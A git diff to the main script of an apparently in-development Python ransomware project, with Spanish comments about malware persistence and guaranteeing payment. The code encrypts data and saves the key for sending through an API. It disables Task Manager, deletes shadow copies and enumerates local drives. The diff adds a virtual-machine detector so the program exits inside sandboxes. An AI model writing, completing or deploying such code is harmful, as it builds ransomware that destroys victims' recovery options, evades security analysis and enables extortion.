@@ -1,4 +1,6 @@
+from re import S
 from .CryptoManager import CryptoManager
+from .VirtualEnvironmentDetector import VirtualEnvironmentDetector
 import os
 import sys
 
@@ -17,9 +19,11 @@ import sys
 # a) Debemos garantizar la persistencia del malware en el dispositivo? => Por lo menos la herramienta para garantizar el pago y la desencriptacion de los datos
 
 if __name__ == '__main__':
+    sys.exit() # Borrar
+
     print("Executing encryption protocol")
     cm = CryptoManager(action='encrypt')
-    cm.save_key_as_file()
+    cm.save_key_as_file() # enviar utilizando la api
 
     # TODO necesitamos no crear nada antes de detectar si estamos ejecutando en un windows o en una virtual machine
     if not cm.is_windows():
@@ -27,14 +31,18 @@ if __name__ == '__main__':
         # cleanup protocol here
         sys.exit()
 
+    ved = VirtualEnvironmentDetector()
+    if ved.neo_takes_blue_pill():
+        print('Exiting the matrix...')
+        sys.exit()
+
     # TODO try except needed
     # WORKING PROPERLY
     cm.disable_task_manager()
     cm.delete_shadowcopies()
     print("Task manager disbled and shadow copies eliminated")
-    input("Press enter to end")
 
-    sys.exit()
+    sys.exit() # Borrar
 
     local_drives = cm.get_local_drives()
     
